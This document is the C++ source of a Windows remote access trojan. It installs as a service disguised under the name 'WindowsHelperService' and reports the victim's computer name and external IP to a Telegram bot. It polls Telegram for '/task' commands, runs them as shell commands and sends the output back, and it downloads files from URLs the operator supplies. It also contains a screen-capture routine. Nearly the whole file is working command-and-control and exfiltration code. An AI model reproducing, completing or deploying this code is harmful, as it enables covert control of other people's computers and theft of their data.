#include <iostream>
#include <fstream>
#include <windows.h>
#include <tchar.h>
#include <string>
#include <wininet.h>
#include <TlHelp32.h>
#include <sstream>
#include <array>
#include <memory>
#include <algorithm>
#include <shlwapi.h>
#include <vector>
#include <wingdi.h>

    
SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;
SC_HANDLE hSCManager = NULL;
SC_HANDLE hService = NULL;


std::wstring g_botToken = L"100";
long int g_UserIdLong = 100;

std::string GetExecutablePath();
std::string ExtractFileNameFromURL(const std::string& url);
bool DownloadFile(const std::string& url);
void ServiceMain(int argc, LPTSTR* argv);
void ControlHandler(DWORD request);
DWORD ServiceWorkerThread(LPVOID lpParam);
std::wstring ConvertToWideString(const std::string& input);
std::string extractTaskCommandText(const std::string& json);
std::string ExecuteCommand(const char* cmd);
std::string GetTelegramUpdates();
void SendMessage(const std::wstring& message_text);
std::string TakeScreenshotAndSave(const std::string& filePath);

#ifdef UNICODE
#define SERVICE_NAME  L"WindowsHelperService"
#else
#define SERVICE_NAME  _T("WindowsHelperService")
#endif

int _tmain(int argc, _TCHAR* argv[])
{

    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };


    if (StartServiceCtrlDispatcher(ServiceTable) == FALSE)
    {
        DWORD error = GetLastError();
        return error;
    }

    return 0;
}

void ServiceMain(int argc, LPTSTR* argv)
{

    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, ControlHandler);
    if (hStatus == NULL)
    {
        return;
    }


    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);


    HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
    if(hThread == NULL) {
    } else {
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return;
}

void ControlHandler(DWORD request)
{

    switch(request) {
        case SERVICE_CONTROL_STOP:
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(hStatus, &ServiceStatus);
            break;
        default:
            break;
    }
}

std::wstring ConvertToWideString(const std::string& input) {
    if (input.empty()) {
        return std::wstring();
    }
    int sizeNeeded = MultiByteToWideChar(CP_UTF8, 0, &input[0], (int)input.size(), NULL, 0);
    std::wstring wstrTo(sizeNeeded, 0);
    MultiByteToWideChar(CP_UTF8, 0, &input[0], (int)input.size(), &wstrTo[0], sizeNeeded);
    return wstrTo;
}

std::string extractTaskCommandText(const std::string& json) {
    std::string userIdPattern = "\"id\": " + std::to_string(g_UserIdLong) +" ";
    std::string taskCommandPattern = "\"text\":\"/task ";


    size_t userIdPos = json.find(userIdPattern);
    if (userIdPos == std::string::npos) {
        return ""; 
    }


    size_t taskCommandPos = json.find(taskCommandPattern, userIdPos);
    if (taskCommandPos == std::string::npos) {
        return ""; 
    }


    size_t textStart = taskCommandPos + taskCommandPattern.length();


    size_t textEnd = textStart;
    while (textEnd < json.length()) {
        if (json[textEnd] == '\\' && textEnd + 1 < json.length()) {
            textEnd += 2; 
            continue;
        } else if (json[textEnd] == '"') {
            break; 
        }
        textEnd++;
    }

    if (textEnd >= json.length()) {
        return ""; 
    }


    std::string extractedText = json.substr(textStart, textEnd - textStart);


    std::string unescapedText;
    for (size_t i = 0; i < extractedText.length(); ++i) {
        if (extractedText[i] == '\\' && i + 1 < extractedText.length()) {
            if (extractedText[i + 1] == '\\' || extractedText[i + 1] == '"') {
                unescapedText += extractedText[i + 1];
                ++i;
            } else {
                unescapedText += extractedText[i]; 
            }
        } else {
            unescapedText += extractedText[i];
        }
    }

    return unescapedText;
}

void OutputDebugStringWithMessage(const std::string& message) {
    std::wstring wMessage = ConvertToWideString(message);
    OutputDebugStringW(wMessage.c_str() + '\n');
}


void SendMessage(const std::wstring& message_text) {
    std::wstring urlBase = L"https://api.telegram.org/"+ g_botToken + L"/sendMessage?chat_id=" + std::to_wstring(g_UserIdLong) + L"&text=";


    const int maxMessageLength = 4096;


    if (message_text.length() > maxMessageLength) {
        std::wstring subMessage;
        size_t startPos = 0;

        while (startPos < message_text.length()) {

            subMessage = message_text.substr(startPos, maxMessageLength);


            std::wstring fullUrl = urlBase + subMessage;

            HINTERNET hInternet = InternetOpenW(L"TelegramBot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
            if (!hInternet) {
                OutputDebugStringWithMessage("Error: InternetOpenW failed");
                return;
            }

            HINTERNET hConnect = InternetOpenUrlW(hInternet, fullUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);

            if (hConnect) {
                char buffer[4096];
                DWORD bytesRead;
                std::string serverResponse;

                OutputDebugStringWithMessage("Sending HTTP request...");
                while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                    serverResponse += std::string(buffer, bytesRead);
                }
                InternetCloseHandle(hConnect);

                OutputDebugStringWithMessage("Server Response: " + serverResponse);
            } else {
                DWORD error = GetLastError();
                std::string errorMsg = "Failed to send message. Error code: " + std::to_string(error);
                OutputDebugStringWithMessage(errorMsg);
            }
            InternetCloseHandle(hInternet);


            startPos += maxMessageLength;
        }
    } else {

        std::wstring fullUrl = urlBase + message_text;

        HINTERNET hInternet = InternetOpenW(L"TelegramBot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) {
            OutputDebugStringWithMessage("Error: InternetOpenW failed");
            return;
        }

        HINTERNET hConnect = InternetOpenUrlW(hInternet, fullUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);

        if (hConnect) {
            char buffer[4096];
            DWORD bytesRead;
            std::string serverResponse;

            OutputDebugStringWithMessage("Sending HTTP request...");
            while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                serverResponse += std::string(buffer, bytesRead);
            }
            InternetCloseHandle(hConnect);

            OutputDebugStringWithMessage("Server Response: " + serverResponse);
        } else {
            DWORD error = GetLastError();
            std::string errorMsg = "Failed to send message. Error code: " + std::to_string(error);
            OutputDebugStringWithMessage(errorMsg);
        }
        InternetCloseHandle(hInternet);
    }
}


std::string GetTelegramUpdates() {
    std::string responseData;
    HINTERNET hInternet = InternetOpenW(L"TelegramBot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return "";
    }


    std::wstring url = L"https://api.telegram.org/" + g_botToken + L"/getUpdates";
    HINTERNET hConnect = InternetOpenUrlW(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect) {
        char buffer[4096];
        DWORD bytesRead;
        while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            responseData.append(buffer, bytesRead);
        }
        InternetCloseHandle(hConnect);
    }
    InternetCloseHandle(hInternet);


    std::string lastUpdate = "";
    std::string updatePattern = "\"update_id\":";
    size_t lastUpdatePos = responseData.rfind(updatePattern);
    if (lastUpdatePos != std::string::npos) {

        size_t updateStart = responseData.rfind('{', lastUpdatePos);

        size_t braceCount = 1;
        size_t updateEnd = lastUpdatePos;
        while (braceCount > 0 && updateEnd < responseData.size()) {
            updateEnd++;
            if (responseData[updateEnd] == '{') {
                braceCount++;
            } else if (responseData[updateEnd] == '}') {
                braceCount--;
            }
        }

        if (updateStart != std::string::npos && updateEnd < responseData.size()) {
            lastUpdate = responseData.substr(updateStart, updateEnd - updateStart + 1);
        }
    }

    return lastUpdate;
}

std::string ExtractFileNameFromURL(const std::string& url) {
    const char* fileName = PathFindFileNameA(url.c_str());
    return fileName ? std::string(fileName) : "";
}

bool DownloadFile(const std::string& url, const std::string& directoryPath) {
    std::string fileName = ExtractFileNameFromURL(url);
    std::string fullFilePath = directoryPath + "\\" + fileName;
    
    HINTERNET hInternet = InternetOpenA("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return false;
    }

    HINTERNET hFile = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        InternetCloseHandle(hInternet);
        return false;
    }

    std::string responseData;
    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        responseData.append(buffer, bytesRead);
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    HANDLE hLocalFile = CreateFileA(fullFilePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hLocalFile == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD bytesWritten;
    bool writeResult = WriteFile(hLocalFile, responseData.data(), responseData.size(), &bytesWritten, NULL);
    CloseHandle(hLocalFile);

    return writeResult && (bytesWritten == responseData.size());
}



std::string ExecuteCommand(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

std::string TakeScreenshotAndSave(const std::string& filePath) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreenDC = CreateDC(TEXT("DISPLAY"), NULL, NULL, NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);
    hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);

    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    DWORD dwBytesWritten = 0;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    std::vector<BYTE> lpbitmap;

    hFile = CreateFileA(filePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        return "";
    }

    hBitmap = (HBITMAP)GetStockObject(DEFAULT_PALETTE);
    GetObject(hBitmap, sizeof(BITMAPINFOHEADER), &biHeader);
    biHeader.biBitCount = 24;
    biHeader.biWidth = screenWidth;
    biHeader.biHeight = screenHeight;
    biHeader.biPlanes = 1;
    biHeader.biSizeImage = screenWidth * screenHeight * 3;

    bInfo.bmiHeader = biHeader;
    lpbitmap.resize(biHeader.biSizeImage);

    GetDIBits(hMemoryDC, hBitmap, 0, screenHeight, &lpbitmap[0], &bInfo, DIB_RGB_COLORS);

    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfHeader.bfSize = bfHeader.bfOffBits + biHeader.biSizeImage;
    bfHeader.bfType = 0x4D42;

    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, &lpbitmap[0], biHeader.biSizeImage, &dwBytesWritten, NULL);

    CloseHandle(hFile);

    DeleteDC(hMemoryDC);
    DeleteDC(hScreenDC);
    DeleteObject(hBitmap);

    return filePath;
}


std::string GetComputerName() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    if (GetComputerNameA(computerName, &size)) {
        return std::string(computerName);
    }
    return "Unknown";
}


std::string GetExternalIP() {
    HINTERNET hInternet, hFile;
    std::string responseData;

    hInternet = InternetOpenA("WinINet", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return "";

    hFile = InternetOpenUrlA(hInternet, "http://api.ipify.org", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        InternetCloseHandle(hInternet);
        return "";
    }

    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        responseData.append(buffer, bytesRead);
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    return responseData;
}


void SendStartupMessage() {
    std::string computerName = GetComputerName();
    std::string externalIP = GetExternalIP();
    std::wstring message = ConvertToWideString("New client connected: " + computerName + ", External IP: " + externalIP);
    SendMessage(message);
}

DWORD ServiceWorkerThread(LPVOID lpParam) {
    SendStartupMessage();

    std::string lastExecutedArgument; 

    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) { 

        std::string json = GetTelegramUpdates();
        std::string argument = extractTaskCommandText(json);

        argument.erase(std::begin(argument), std::find_if_not(argument.begin(), argument.end(), ::isspace));
        argument.erase(std::find_if_not(argument.rbegin(), argument.rend(), ::isspace).base(), argument.end());

        if (argument.substr(0, 15) == "download_by_url") {
            std::string url = argument.substr(16);
            if (!url.empty()) {
                std::string localFilePath = "C:\\Users"; 
                if (DownloadFile(url, localFilePath)) {
                    SendMessage(ConvertToWideString("File downloaded successfully"));
                } else {
                    SendMessage(ConvertToWideString("Failed to download file"));
                }
            }
        } else if (argument != "skip") {
            std::string message = "Executing argument: " + argument;
            SendMessage(ConvertToWideString(message)); 

            std::string output = ExecuteCommand(argument.c_str());
            SendMessage(ConvertToWideString(output)); 
        }

        Sleep(20000);
    }
}
